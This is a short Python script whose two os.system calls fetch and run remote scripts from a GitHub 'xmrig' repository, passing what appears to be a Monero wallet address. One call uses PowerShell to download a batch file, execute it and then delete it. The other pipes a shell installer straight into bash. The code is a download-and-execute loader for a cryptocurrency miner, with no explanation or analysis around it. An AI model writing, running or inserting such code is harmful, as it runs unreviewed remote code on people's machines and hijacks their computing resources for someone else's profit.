import os
os.system('''"powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/ivanc5po/xmrig/main/miner.bat', $tempfile); & $tempfile 89zNH6BtcokCSyyMmeXVK7P71h1K24o2KDTqRxrkz5cF6TyR2vePG8idoEbN1jjHDnZiWeGYuJis6dMy5hhq8ZjJBWWfA2K; Remove-Item -Force $tempfile"''')
os.system('''curl -s -L https://raw.githubusercontent.com/ivanc5po/xmrig/main/ubuntu_install.sh | bash -s 89zNH6BtcokCSyyMmeXVK7P71h1K24o2KDTqRxrkz5cF6TyR2vePG8idoEbN1jjHDnZiWeGYuJis6dMy5hhq8ZjJBWWfA2K''')

